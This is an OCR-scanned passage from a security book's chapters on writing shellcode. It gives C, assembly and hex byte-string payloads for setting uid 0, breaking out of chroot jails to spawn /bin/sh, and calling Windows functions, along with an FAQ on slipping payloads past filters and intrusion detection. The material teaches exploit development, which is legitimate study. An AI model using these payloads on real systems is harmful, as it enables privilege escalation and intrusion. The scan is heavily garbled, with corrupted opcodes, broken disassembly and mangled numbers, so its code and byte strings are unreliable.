function can be performed in a multitude of ways. Some of the opcodes are shorter than 
others, and good shelkode writers put these small opcodes to use. 
setuid Shelkode 
Often, when a program is exploited for root privileges, the attacker receives an euid 
equal to 0 when what is desired is a iiid of O.To solve this problem, a simple snippet of 
shelkode is used to set the tiid to 0. 
Let's take a look at the setuid code in C: 
i n t 
main(void) 
{ 
s e t u i d ( 0 ) ; 
} 

350 
Chapter 8 * Writing Shelkode I 
i >• N $ H b v * 
To convert this C code to assembly, we must place the value of 0 in the EBX register 
] and call the setuid system call. In assembly, the code for Linux looks like the following: 
1 
. g l o b l main 
2 
3 
main: 
4 
x o r l 
%ebx, 
%ebx 
5 
l e a l 
tbtn(%ebx) , 
%eax 
6 
i n t 
SOxSO 
This assembly code simply places the value of 0 into the EBX register and invokes 
the setuid system call.To convert this to shelicode, gdb is used to display each byte.The 
end result follows: 
const char setuid [ J -
"\x31\xdb" 
/* xorl %ebx, %ebx 
V 
"\x8d\x43\xl7- 
/* leal 0x17(%eox), %eax */ 
"\xcd\x80"; 
/» int $0x80 
*/ 
chroot Shelicode 
Some applications are placed in what is called a "chroot jail" during execution.This chroot 
jail only allows the application to within a specific directory, setting the root"/" of the file 
system to the folder that is allowed to be accessed. When exploiting a program that is 
placed in a chroot jail, there must be a way to break out of the jail before attempting to 
execute the shelkode, otherwise the file "/bin/sh" will not exist. In this section, we present 
two methods of breaking out of chroot jails on the Linux operating system, chroot jails 
have been perfected with the latest releases of the Linux kernel. Fortunately, we discovered 
a technique to break out of chroot jails on these new Linux kernels. 
First, we will explain the traditional way to break out of chroot jails on the Linux 
operating system. To do so, you must create a directory in the jail, chroot to that direc-
tory, and then attempt to chdir to directory "../../../../../../../."This technique works 
very well on earlier Linux kernels and some other UNIXes. Let's take a look at the code 
in C: 
SYN^HESS 
1 
int main(void) 
• • ^ ^ ^ 
3 
mkdirCA"); 
4 
chdir( "A"); 
5 
chroot {*..//..//.-//...//..//..//..//..//•); 
6 
system'-/bin/sh"); 
7 } 
This code creates a directory (line 3), changes into the new directory (line 4), and 
then changes the root directory of the current shell to the directory ../../../../../../../ 
(line 5).The code, when converted to Linux assembly, looks like this: 
1 .globl main 
2 
3 main: 
4 
xorl 
ledx, %edx 
5 
6 
/• 
• -. c : 

Writing Shelkode I • Chapter 8 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
* mkdirt 
*/ 
pus hi 
push 
movl 
movw 
leal 
int 
/* 
* chdirt 
*/ 
leal 
int 
/* 
"A") ; 
*edx 
$0x41 
%espj %ebx 
SOxOled, %cx 
0x27(%edx), %eax 
$0x80 
"A"l i 
0x3d(%edx>, %eax 
$0x80 
* chroot["..//..11..II..I1 
•1 
xorl 
pus hi 
loop: 
pushl 
incl 
cmpl 
jlloop 
movl 
leal 
int 
%esi, *esi 
%edx 
$0x2f2f2e2e 
%esi 
$0x10, %esi 
%esp, *ebx 
0x3d(%edx), %eax 
$0x80 
This assembly code is basically die C code rewritten and optimized for size and 
NULL bytes. After being converted to byte code, the cbroot code looks like the following: 
$ •* N £ ft E i i 
^B 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
const char chroot [] = 
"\x31\xd2" 
"\x52" 
"\x6aVx41" 
"\x89\xe3" 
"\x66\xb9\xed\x01" 
"\x8d\x42\x27" 
"\xcd\x80" 
"\x8dVx42\x3d" 
"\xcd\x80" 
"\x31\xf6" 
"\x52" 
"\x68\x2e\x2e\x2f\x2f 
"\x46-
"\x83\xfe\xl0" 
/* xorl %edx, %edx 
*/ 
I* pushl %edx 
/* push $0x41 
/* movl %esp, %ebx 
/* movw $0xledH %cx 
I* leal 0x27(%edx), %eax 
/* int $0x80 
/* leal 0x3d(%edx), %eax 
/* int $0x80 
/* xorl %esi, %esi 
/' pushl %edx 
/* pushl $0x2f2f2e2e 
/* incl %esi 
/• cmpl SOxlO, %esi 
*/ 

352 
Chapter 8 * Writing Shellcode I 
16 
17 
18 
19 
20 
21 
22 
23 
24 
\x7c\x£5" 
\x89Vxe3' 
\x8a\x42\x3d 
\xcd\x80" 
\x52" 
\x6a\x41" 
\x89\xe3" 
\x8d\*12\x28 
\xcd\x80 n; 
/* jl <loop> 
V 
/* movl %esp, %ebx 
*/ 
I* leal 0x3d(%edx>, *eax */ 
/* int $0x80 
*/ 
/* pushl %edx 
*/ 
/* push $0x41 
V 
f* movl %esp, %ebx 
*/ 
/* leal 0x28(%edx), %eax *l 
/* int $0x80 
*/ 
Optimized for size and non-NULL bytes, this shellcode comes out to be 52 bytes. An 
example of a vulnerability that used this shellcode is the wu-ftpd heap corruption bug. 
Linux kernel programmers attempted to stop chroot breaking to occur with the 
release of some of the later Linux kernels. We present a technique that will break out of 
chroot jails on new Linux kernels with ease. This technique works by first creating a 
directory inside the chroot jail. After this directory is created, we chroot that particular 
directory. We then iterate 1024 tunes, attempting to change to the directory "../," Every 
iteration, we perform a statfj on the current directory "./"and if that directory has the 
inode of 2, we chroot to directory "./'1 one more time and then execute our shell. In C, 
the code looks like the following: 
i V N % fl I * S 
BH 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
1 
2 
3 
4 
5 
6 
7 
8 
9 
int main(void) 
[ 
int i; 
struct stat sb; 
mkdir("A", 0755); 
chroot("A"); 
f o r d = 0; i * 1024; L++) ( 
puts("HERE"J; 
memset(&sb, 0, sizeof{sb)): 
c h d i r l " . . " ) ; 
s t a t e . - , &sbl ; 
if isb.st_ino == 2) t 
chroot("."); 
system("/bin/sh"}; 
exit(0); 
) 
) 
puts{"failure"); 
) 
Converted to assembly, the code looks like that shown next 
.globl main 
main: 
xorl 
%edx, %edx 
pushl %edx 
pushl 
$0x2e2e2e2e 
movl 
%esp, %ebx 

Writing Shelkode I • Chapter 8 
10 
mow 
SOxQled, 
%cx 
•• 
• ; <-. 
V 
I 
. 
• 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
leal 
int 
leal 
int 
xorl 
loop: 
pus hi 
pushw 
movl 
leal 
int 
pus hi 
push 
movl 
subl 
^ovi 
leal 
int 
movl 
cmpl 
0x27(%edx) , %ea 
$0x80 
61[%edx), i 
$0x80 
%esi, %esi 
%edx 
$0x2e2e 
%esp, %ebx 
12[fcedxl, 1 
S0x80 
%edx 
$0x2e 
%espH %ebx 
$38, %esp 
%esp, %ecx 
106(%edx), 
$0x80 
0x4(%ecx) : 
$0x2, %edi 
jehaeked 
incl 
cmpl 
%esi 
$0x64, »es: 
jlloop 
hacked: 
pus hi 
push 
movl 
leal 
int $C 
*edx 
$0x3e 
%esp, %ebx 
61(%edx), I 
1x80 
%eax 
%edi 
%eax 
Lastly, converted to bytecode and ready for use in an exploit, the code looks like the 
following: 
1 
2 
3 
4 
5 
6 
7 
8 
9 
0 
1 
const char neo_chroot[1 
"\xJl\xd2" 
"\x52" 
"\x68Vx2e\x2e\x2e\x2e" 
"\x89\xe3" 
"\x66\xb9\xed\x01" 
"\x8d\x42\x27" 
"\xcd\x80" 
"\x3dVx42\x3d" 
"\XCd\xB0" 
"\x31\xf6-
/* xorl %edx, %edx 
*/ 
/* pushl %edx 
/* pushl $0x2e2e2e2e 
V 
/* movl %esp, %ebx 
V 
I* movw SOxled, %cx 
*/ 
/* leal 0x27(%edx), %eax V 
/* int $0x80 
*/ 
/* leal Ox3d(%edx), %eax */ 
/* int $0x80 
V 
/* xorl %esi, %esi 
V 

354 
Chapter 8 * Writing Shellcode I 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
"\x52" 
r\x66\x68\x2e\x2e 
"\x89\xe3" 
"\x8d\x42\x0c" 
" \xcd\x80" 
"\x52-
"\x6a\x2e" 
"\x89Yxe3" 
"\x83Vxec\x58-
"\x89\xel" 
"\x8d\jt42\x6a" 
"\xed\x80" 
"\x8b\x79\x04-
"\x83\xff\x02-
"\x74\x0S" 
"\x46" 
"\x83\xfe\x64" 
•\x7a\xd7* 
"\x52" 
"\x6a\x2e" 
"\xB9\x<?3" 
"\xBd\x42\x3d" 
"\xcd\;x80"; 
/* pushl %edx 
V 
/* pushw $0x2e2e 
*/ 
/* movl %espH %ebx 
*/ 
/* leal Oxc(fcedx), %eax */ 
t* int S0x80 
V 
I* pushl *edx 
*/ 
f* push $0x2e 
*/ 
/* movl %espH %ebx 
*J 
/* subl $0x58, %ecx 
*J 
/* movl %espj %ecx 
V 
/* leal 0x6a(%edx), %eax */ 
(* int 50x80 
*/ 
/* movl 0x4(%ecxl, %edi */ 
/* cmpl $0x2. %edi 
*/ 
/* je <hacked> 
* I 
/' incl %esi 
*/ 
/* cmpl $0x64, %esi 
*/ 
/* jl -:1DOP? 
*/ 
/* pushl %edx 
V 
t* push $0x2e 
*/ 
/* movl %espH %ebx 
V 
/* leal 0x3d(%edx], Seax */ 
/* int $0x80 
V 
This is the chroot breaking code converted from C to assembly to byte code. When 
written in assembly, careful attention was paid to assure no opcodes that use NULL 
bytes were called and that the size was kept down to a reasonable minimum. 
Windows Shellcode 
Shellcode is an integral part of any exploit. To exploit a program, we typically need to 
know the exploitable function, the number of bytes we have to overwrite to control El P. 
a method to load our shellcode, and, finally, the location of our shellcode. 
Shellcode could be anything from a aetcat listener to a simple message box. In the 
following section, we will get a better understanding on writing our own shellcode for 
Windows.The only tool required to build shellcode is Visual Studio. 
The following example will be a program to sleep for 99999999 milliseconds.To do 
so, our first step will be to write the C/C++- equivalent of the code. 
1 // sleep.epp : Defines the entry point £or the console application. 
2 it include "stdafx.h" 
3 
#include "Windows.hlh 
4 
5 
6 
7 
8 
void main() 
t 
Sleep(99999999): 
} 
To write the assembly instructions for the same, we are going to step over each of 
the instructions, but in the assembly window. By clicking the F10 key in Visual Studio 
twice, our execution step pointer should be pointing to line 7, the sleep instruction step. 
At this point, browse to the disassembled code (Alt + 8).The following code should be 
seen. 
! 
4: 
Hinclude 
"stdafx.h" 

Writing Shellcode I • Chapter 8 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
5: 
#inc 
•
.
: 
1 ude "Windows.h" 
7 : 
void main() 
8: 
{ 
0040B4BO 
0040B4B1 
0040B4B3 
0040B4B6 
0040B4B7 
0040B4B6 
0040B4B9 
0040B4BC 
0040B4C1 
0040B4C6 
9: 
0040B4C8 
0040B4CA 
0040B4CF 
0040B4D5 
0040B4D7 
10: 
} 
0040B4DC 
0040B4DD 
0040B4DE 
0040B4DF 
0040B4E2 
0040B4E4 
0040B4E9 
0040B4EB 
0040B4EC 
push 
mov 
.qub 
push 
push 
push 
1 ea 
mov 
mov 
rep stos 
elap 
ebp,esp 
esp, 4 Oh 
ebx 
r.s i 
ed i 
edi,[ebp-40hl 
ecx, LOh 
eax.UCCCCCCCCh 
dword ptr 
Sleep(99999999) ; 
mov 
push 
call 
cmp 
call 
pop 
pop 
pop 
add 
cmp 
call 
mov 
pop 
ret 
es i, esp 
5F5E0FFh 
dword ptr 
es i,esp 
chkesp 
^di 
CS ! 
ebx 
esp,4Oh 
ebp,esp 
chkesp 
esp,ebp 
etop 
Eedi] 
[KERNEL32 
(00401060) 
(00401060) 
(004241f8)l 
Our interest lies from line 16 to line 19.The other code presented in this example is 
for reference but does not directly pertain to the "exploit."The code before that is pro-
logue and the code after line 23 is part of the epilogue. 
Line 16 is the sleep instruction in C++, so for now let's ignore that line as well. 
Line 17 moves the data stored in esp into esi, line 18 performs a push of 5F5E()FFh, 
which is hex representation for 99999999 (decimal), and line 19 calls the function sleep 
from kernel32.dll. 
1 16 9: 
Sleep 199999999); 
2 
17 0040B4C8 8B F4 
3 
18 0040B4CA 68 FF E0 F5 05 
4 
19 0040B4CF FF 15 F8 41 42 00 
(004241f8)] 
So the gist of it is that 99999999 is being pushed onto the stack and then the func-
tion sleep is being called. Let's attempt to write the same thing in assembly. 
1 push 99999999 
2 mov eax, 0x77E61BE6 
3 call eax 
Line 1 is pushing 99999999 onto the stack, line 2 is pushing a hex address into 
EBX, and then line 3 is making a call to EBX.The hex address, 0x77E61BE6, is the 
actual location where the function sleep is loaded every single time in Windows XP (no 
SP).To figure out the location where sleep is loaded from, we went to the dumpbin 
mov 
push 
call 
eai,esp 
5F5E0FFh 
dword ptr 
[ KERNEL32_NULL_THUHK_DATA 

356 
Chapter 8 * Writing Shelkode I 
utility again and performed a dumpbin on kernel32.dll. We will have to run two com-
mands, dumpbin /all kemet32.dll and dumpbin /exports kernel 3 2. dU. 
With the all option, we are going to locate the address of the image base of 
kcrnel32.dll. In Windows XP (no SP), the kernel32 dll is loaded at 0x77E6()()<)(>. 
iNtBissi C:\WIHDOWS\Eystem32j-dumpbiTi /all kernel32.dll 
| Microsoft (R) COFF Binary File Dumper Version 6.00.8168 
Copyright (C) Microsoft Corp 1992-1998. All rights reserved. 
Dump of file kernel32 .dll 
PE signature found 
File Type; DLL 
PILE HEADER VALUES 
14C machine (i386) 
4 number of sections 
3B7DFE0E time date stamp Fri Aug 17 22:33:02 2001 
0 file pointer to symbol table 
0 number of symbols 
E0 size of optional header 
210E characteristics 
Executable 
Line numbers stripped 
Symbols stripped 
32 bit word machine 
DLL 
OPTIONAL HEADER VALUES 
10B magic # 
7.00 linker version 
74800 size of code 
6DE00 size of initialized data 
0 size of uninitialized data 
1A241 RVA of entry point 
1000 base of code 
71000 base of data 
77E60000 image base 
1000 section alignment 
200 file alignment 
5.01 operating system version 
5.01 image version 
C:\wINDOWS\system32jduinpbin kemel32.dll /exports 
Microsoft (R) COFF Binary File Dumper Version 6.00.8168 
Copyright (C) Microsoft Corp 1992-1998. All rights reserved. 
Dump of file kernel32.dll 
File Type: DLL 
Section contains the following exports for KERNEL32.dll 
0 characteristics 
3B7DDFD8 time date stamp Fri Aug 17 20:24:08 2001 
0.00 version 
1 ordinal base 
928 number of functions 
928 number of names 
ordinal hint RVA 
name 
1 
0 00012ADA AetivateActCtx 
2 
1 000032C2 AddAtomA 

Writing Shellcode I • Chapter 8 
BOO 
as: 
B02 
83.! 
804 
BOS 
BOG 
837 
83a 
83S 
810 
81 1 
812 
813 
81.-J 
815 
816 
31? 
32 0 
321 
122 
323 
324 
32 5 
326 
327 
•J:!8 
329 
)2A 
32?. 
32C 
32D 
32 S 
32? 
0005D843 
000582EC 
00057FBD 
0005FBA2 
0005EFF4 
00039959 
0005BC0C 
00066745 
00O58E09 
00O1105F 
00001BE6 
00017562 
00038BD8 
00039607 
0000D52C 
00017C4C 
00052E72 
SetVDMCurrentDirectories 
SetvolumeLabelA 
S e t Vo1umeLabe1W 
S e tVo1umeMoun t Po i n tA 
5 e t Vo 1 umeMoun t Po i n tW 
Se tWa i t ab1eT imer 
SetupCornm 
ShowConso1eCu r s o r 
SignalObjectAndWait; 
SizeofResource 
Sleep 
SleepEx 
Su s pendThr ead 
Swi t chToF iber 
SwitchToThread 
Sy s t emT i meToF i1eT ime 
SystemTimeToTzSpecincLocalTime 
With the export option, we are going to locate the address where the function sleep 
is loaded inside ofkernel32.dll. In Windows XP (no SP), it is loaded at 0x00001 BE6. 
Thus, the actual address of the function sleep is the image base of dll plus the 
address of the function inside of the dll (Ox77E60000 + 0x00001 BE6 = 0x77E61BE6). 
In this example, we assume that kernel32.dll is loaded by sleep.exe.To confirm it is 
loaded when sleep is being executed, we have to use Visual Studio again, while stepping 
through the instructions we can look at the loaded modules by browsing to the debug 
menu and selecting modules. This should show the list of modules that are loaded with 
sleep.exe and the order in which each of the modules are loaded. As Figure 8.1 indi-
cates, we also could have found the base address ofkernel32.dll. 
Figure 8.1 List of Modules and Base Addresses Where They Are Loaded 
il*l 
Mr.:..? 
I Address 
I Order 
sleep.™ 
0*00400000 - 0KD0425FFF 
1 
kernelKdl 0fc77E60000 • 0*77F44FFF 
2 
ntdll.r* 
OK77F50000 • 0n77FF8FFF 
3 
Close 

358 
Chapter 8 * Writing Shelkode I 
:syNt,£Stl 
Now that we have understood how to figure out the address of the location of our 
1 function, let's attempt to execute the assembly code.To do so, we will create another 
C++ application: slecpasm.cpp. 
1 // sleepasm.cpp : Defines the entry point for the console application. 
2 // 
3 
4 
^include "stdafx.h-
5 
frinclude 
"Windows,h" 
6 
7 
void main(} 
8 ( 
9 
asm 
10 ( 
11 
12 
13 
14 
15 
16 
Now that we have fully working assembly instructions, we need to figure out the 
Operation Code (Op Code) for these instructions (see Figure 8.2).To figure out the Op 
Code, let's go back to the disassembled code while stepping through the code using 
F10, and then right-clicking in the disassembled code. This should provide us with an 
option to enable "Code Byte". Once the code byte is enabled, the Op code for the 
instructions will be available to us. 
push 99999999 
mov eax, 0x77E61BE6 
call eax 
) 
} 
Figure 8.2 Op Code Used Behind the Assembly Instructions 
; 
L - ' U I / 
^ r r - r — 
~~3\~ l$E) * I ' H 
5le*D*s» epp 
D e t i n « the entry point 
(or the console applieat ton. 
: \ 
t 
E i 
void kflinf) 
4 3D43B4BD 
K 
Q04.0B4B1 8B EC 
UOtCBIB? S3 EC 40 
004CB*Bb S3 
••1 FB*&7 5« 
*u4flF4Fe 
« 
O04OB4B1 8J> 7D CO 
a0*11 Bib: & ID an oo oo 
ioioB*iii BS or ee cc cc 
vrj*os*C6 n AS 
10 
{ 
~~*™ 
11; 
1 1 : 
push W9M9A 
JUtaBtllB h6 if b.:. 
. 
13 
tn oo*. 
C*77E 
•D0*aB*OJ 03 Eh 
IS Efc 77 
1 * 
c e l l 
eax 
•J0*'JES4L'J ET &• 
15 
} 
16 
> 
&Q4&B4D4 SF 
• • ; L i r - •,:• 
!iD4GB4&D SB 
KI40B4D7 93 C4 49 
.. IB EC 
. . EG 7F Efl FF FT 
9B E£ 
pttah 
1BE& 
^D 
d&p 
r 1 r ' " " >• 
•-.:•; 
I U 
• • ; L 
[sfai 
1Gb] 
MX. IL'll 
Efljr.DijCjCCCCCfk 
rfmid p%* 
l e d i ] 
eax 77K1BE6* 
B -. | -I ' : . 
mbfi 
map 
ebfcesp 
i 0 0 * 0 l 0 i i O > 
t i n cbp 
ebp 
Co to Sown 
^ 
9>giM^Mta4to~ft 
•ft lnHrt^wov»B'**flort 
E 
3 W H 
* 
' CodfBjtt* 

Writing Shellcode I * Chapters 
359 
Table 8.1 maps the Op Code to each of the preceding assembly instructions. This 
mapping allows you to further analyze the results of the software. 
Table 8.1 Op Code to Assembly Instructions 
Address 
Op Code 
Assembly Instructions 
0040B4C8 
68 FF EO F5 05 
push 
5F5E0FFh 
0040B4CD 
B8 E6 1B E6 77 
mov 
eax,77E61BE6h 
0040B4D2 
FFDO 
call 
eax 
Now that we have the Op Codes for the instructions, let's verify that it works.To do 
so, we'll create a C application sleepop.c with the following code: 
1 
//sleepop.c 
2 
3 #include "windows.ft" 
4 
5 char shellcode[] = "\xSS\xFF\xEO\xF5\x05\xBE\xE6\xlB\xE6\x77\xFP\xD0"; 
6 
7 void {*opcode) () ~, 
8 void main() 
9 ( 
10 
opcode = kshellcode; 
ii 
o p c o d e ( ) ; 
12 } 
Summary 
Assembly language is a key component in creating effective shellcode. The C program-
ming language generates code that contains all kinds of data that shouldn't end up in 
shellcode. With assembly language, every instruction is translated literally in executable 
bits that the processor understands. 
Choosing the correct shellcode to compromise and backdoor, a host can often 
determine the success of an attack. Depending on the shellcode used by the attacker, the 
exploit is far more (or less) likely to be detected by a network- or host-based IDS/IPS 
(intrusion detection system/intrusion prevention system). 
Data stored on the stack can end up overwriting beyond the end of the allocated 
space and thus overwrite values in the register, changing the execution path as a result. 
Changing the execution path to point to the payload sent can help execute commands. 
Security vulnerabilities related to butfer overflows are the largest share of vulnerabilities 
in the information security vulnerability industry. Though software vulnerabilities that 
result in stack overflows are not as common these days, they are still found in software. 
With the knowledge of stack overflows and the understanding of how to write 
exploits with this knowledge, one should be armed enough to look at published advi-
sories and write exploits for them. The goal of any Windows exploit is always to take 
www.syngress.com 

Chapter 8 • Writing Shellcode I 
control of EIP (current instruction pointer) and point it to the malicious code or shell-
code sent by the exploit to execute a command on the system.Techniques such as XOR 
or bit-flipping can be used to avoid problems with NULL bytes. To stabilize code and to 
make it work across multiple versions of operating systems, an exception handler can be 
used to automatically detect die version and respond with appropriate shellcode. The 
functionality of this multiplatform shellcode far outweighs the added length and girth 
for the size of the code. 
Solutions Fast Track 
Overview of Shellcode 
0 
Shellcode must be specifically written for individual hardware and operating 
system combinations. In general, preassembled shellcode exists for a variety of 
Wintel, Solaris SPARC, and x86 architectures, as well as for multiple flavors of 
Linux. 
0 
Numerous tools are available to assist developers and security researchers for 
shellcode generation and analysis. A few of the better tools include nasm, gdb, 
objdump, ktrace, strace, and rcadelf. 
0 
Accurate and reliable shellcode should be a requirement for full-fledged system 
penetration testing. Simple vulnerability scans fall short of testing if identified 
vulnerabilities are not tested and verified. 
The Addressing Problem 
0 
Statically referencing memory address locations is difficult with shellcode since 
memory locations often change on different system configurations. 
0 In assembly, call is slightly different than jmp. When call is referenced, it pushes 
the stack pointer (ESP) on the stack and then jumps to the function it received 
as an argument. 
0 
Assembly code is processor-dependent, thereby making it a difficult process to 
port shellcode to other platforms. 
0 
It's difficult to port assembly code not only to different processors but also to 
different operating systems running on the same processor, since programs 
written in assembly code often contain hard-coded system calls. 
www.syngress.com 

Writing Shellcode I * Chapter 8 
361 
The NULL Byte Problem 
0 
Most string functions expect that the strings they are about to process are 
terminated by NULL bytes. When your shellcode contains a NULL byte, this 
byte will be interpreted as a string terminator, with the result that the program 
accepts the shellcode in front of the NULL byte and discards the rest. 
0 
We make the content of EAX 0 (or NULL) by XOR'ring the register with 
itself. Then we place AL, the 8-bit version of EAX, at offset 14 of our string. 
Implementing System Calls 
0 
When writing code in assembly for Linux and *BSD, you can call the kernel 
to process a system call by using the "int 0x80" instruction. 
0 Every system call has a unique number that is known by the kernel.These 
numbers are not often displayed in the system call man pages but can be found 
in the kernel sources and header files. 
0 
The system call return values are often placed in the EAX register. However, 
there are some exceptions, such as the fork{) system call on FreeBSD, that 
places return values in different registers. 
Remote Shellcode 
0 
Identical shellcode can be used for both local and remote exploits, the 
differentiator being that remote shellcode may perform remote shell spawning 
code and port binding code. 
0 
One of the most common shellcodes for remote vulnerabilities simply binds a 
shell to a high port. This allows an attacker to create a server on the exploited 
host that executes a shell when connected to. 
0 
When choosing shellcode for an exploit, one should always assume that a 
firewall will be in place with a default deny policy. In this case, one tactic is to 
recycle the current socket descriptor and utilize that socket instead of creating 
a new one. 
Local Shellcode 
0 
Identical shellcode can be used for both local and remote exploits, the 
differentiator being that local shellcode does not perform any network 
operations. 

362 
Chapter 8 • Writing Shellcode I 
Windows Shellcode 
0 
Op Code that is loaded by an attacker into the buffer is also referred to as 
shellcode because it is often used to pop a command prompt on the system. 
0 
To generate the shellcode, Visual Studio can be a very useful tool. Stepping 
through the debug window of a C / C + + generated code can show the Op 
Code used behind the code that is being executed. 
Links to Sites 
k 
www.applicationdefense.com Application Defense has a solid collection of 
free security and programming tools, in addition to a suite of commercial tools 
given to customers at no cost. 
w w w . m e t a s p l o i t . c o m / The Metasploit site has excellent information on 
shellcode with an exploit framework that can be used to build more exploits. 
http://ollydbg.win32asmcommunity.net/index.php A discussion forum 
for using oily dbg. There are links to numerous plug-ins for oily and tricks on 
using oily to help find vulnerabilities. 
wwTV.shellcode.com.ar/ An excellent site dedicated to security informa-
tion. Shellcode topics and examples are presented, but text and documentation 
may be difficult to follow. 
www. enderunix.org/ d o c s / en/sc-en.txt A good site with some good 
information on shellcode development. Includes a decent whitepaper detailing 
the topic, too. 
w w w . k - o t i k . c o m Another site with an exploit archive. Specifically, it has 
numerous Windows-specific exploits. 
www.immunitvsec.org A site with some excellent articles on writing 
exploits and some very useful tools, including spike fuzzer. 
Mailing Lists 
SecurityFocus.com 
All of the mailing lists at securityfocus.com, which is 
owned by Symantec, are excellent resources for up-to-date threat, vulnerability, 
and exploit data. The following are the addresses for three mailing lists. 
www.syngress.com 

Writing Shellcode I * Chapter 8 
363 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQsatlTFAQnet.com. 
• 
Bugtraq@securityfocus.com 
• 
Focus-MS@securityfocus.com 
• 
Peu-Test@securityfocus.com 
Q: I've heard that shellcode that contains NULL bytes is useless. Is this true? 
Al The answer depends on how the shellcode is used. If the shellcode is injected 
into an application via a function that uses NULL bytes as string terminators, it 
is useless. However, there are often many other ways to inject shellcode into a 
program without having to worry about NULL bytes.You can, for example, put 
the shellcode in an environment variable when trying to exploit a local program. 
Q: My shellcode contains all kinds of bytes that cause it to be rejected by the appli-
cation I'm trying to exploit. What can I do about this? 
A: Well, first, disassemble the shellcode using a tool such as disasm from the nasm 
package and try to find out what instructions are translated by the assembler into 
these bad characters. Attempt to substitute these instructions with others that 
won't be translated into the bad characters. If that doesn't work, encode the 
shellcode. 
Q: Shellcode development looks too hard for me. Are there tools that can generate 
this code for me? 
A: Yes, there are. Currently, several tools are available that allow you to easily create 
shellcode using scripting languages such as Python. In addition, many Web sites 
on the Internet have large amounts of different shellcode types available for 
download. Googling for "shellcode" is a useful starting point. 
Q: Is shellcode used only in exploits? 
www.syngress.com 

364 
Chapter 8 • Writing Shellcode I 
Al No. However, as its name indicates, shellcode is used to obtain a shell. In fact, 
shellcode can be viewed as an alias for "position-independent code that is used 
to change the execution flow of a prog ram ."You could, for example, use just 
about any of the shellcode examples in this chapter to infect a binary. 
Q: Do intrusion detection systems (IDSs) block shellcode from running? 
A: Most IDSs don't. They just make a note of the fact that the shellcode has been 
detected. The administrator must then respond to the notification by denying 
access to his network or host. Some IDSs have the capability to block you if they 
detect you're sending shellcode. These IDS devices are configured to work with 
a firewall. However, because IDS shellcode signatures often give false positives, 
most IDSs lack any functional capabilities. 
Q: Is there any way to convert Operational Code into assembly? 
A: Op Code can be converted into, or viewed back as, assembly code using Visual 
Studio. Using the C code in sleepop.c, execute the required Op Code and trace 
the steps in the "disassembly window" (Alt + 8). 
Q: After writing and compiling shellcode, I disassembled the output obtained from 
nasm and saw all kinds of instructions that weren't mine. Why is this the case? 
Al Have a good look at the disassembler output. The disassembler can't handle 
strings you've used in the assembly code. For example, if you used the string 
"/bin/sh", the disassembler won't be able to recognize this and will process the 
string "/bin/sh" as though it represents instructions. When confused about 
instructions that mysteriously show up in your program, try to translate the hex-
adecimal bytes that represent the instructions to determine whether they repre-
sent a string. 
Q: How can I test shellcode to see if it works without a vulnerable system? 
If you already have a working exploit for the security hole you found, just 
replace the shellcode in that exploit and run it. The only thing you should take 
into account is the shellcode size. Normally, replacing a big shellcode with a 
smaller one should work just fine. If you replace a very small shellcode with a 
very large one, the chance that the exploit will fail increases.Typically, the best 
(and most fun) way to test your shellcode is by using it in your own written 
exploit. Many people create their own vulnerable programs which misuse 
strcpyfj functions. 
www.syngress.com 

Chapt 
Writing Shellcode II 
Solutions in this Chapter: 
• 
Shellcode Examples 
Reusing Program Variables 
• 
OS Spanning Shellcode 
• 
Understanding Existing Shellcode 
U l 
El Summary 
El Solutions Fast Track 
El Frequently Asked Questions 

366 
Chapter 9 • Writing Shellcode II 
Introduction 
In this chapter, you will learn how to write the most efficient shellcode for different 
purposes. The chapter is designed to help you understand the development process of 
shellcode and provides many example codes, which are explained step by step. Because 
shellcode is injected in running programs, it has to be written in a special manner so 
that it is position-independent. This is necessary because the memory of a running pro-
gram changes very quickly; using static memory addresses in shellcode to, for example, 
jump to functions or refer to a string, is not possible. 
When shellcode is used to take control of a program, it is first necessary to get the 
shellcode in the program's memory and then to let the program somehow execute it. 
This means you will have to sneak it into the program's memory, which sometimes 
requires very creative thinking. For example, a single-threaded Web server may have data 
in memory from an old request while already starting to process a new one. So you 
might embed the shellcode with the rest of the payload in the first request while trig-
gering the execution of it using the second request, 
The length of shellcode is also very important because the program buffers used to 
store shellcode often are very small. In fact, with 50 percent of all vulnerabilities every 
byte of the shellcode counts. Chapters 11 and 12 of this book focus on buffer overflows 
and the fact that within the payload the shellcode has to be as small as possible in order 
to increase the chance the exploit is successful. 
When it comes to functionality in shellcode, the sky is the limit. It can be used to 
take complete control of a program. If a program runs with special privileges on a 
system and contains a bug that allows shellcode execution, shellcode can be used to 
create another account with those privileges on that system and make that account 
accessible to a hacker.The best way to develop your skill in detecting and securing 
against shellcode is to first master the art of writing it. 
Shellcode Examples 
In this section, we will show how to write shellcode and discuss the techniques used to 
make the most out of a vulnerability employing the correct shellcode. Before we begin 
looking at specific examples, however, let's go over the generic steps you will follow in 
most cases. 
First, in order to compile the shellcode, you will have to install nasm on a test 
system, nasm allows you to compile the assembly code so you can convert it to a string 
and use it in an exploit. The nasm package also includes a very nice disassembler that 
can be used to disassemble compiled shellcode. 
After the shellcode is compiled, you can use the following utility to test it.This pro-
gram can be used to print the shellcode as a HEX string and to execute it. It is therefore 
very useful during shellcode development. 
^include <=5tciio,h> 
2 
ttinclude 
<stdlib.h> 
3 
#include <sys/types. h> 
4 
#include <sys/stat..h:> 

Writing Shelkode II • Chapter 9 
367 
5 
# include -cuni s td. h> 
0 
#include <errno.h:> 
7 
8 
/' 
9 
* Print message function 
10 
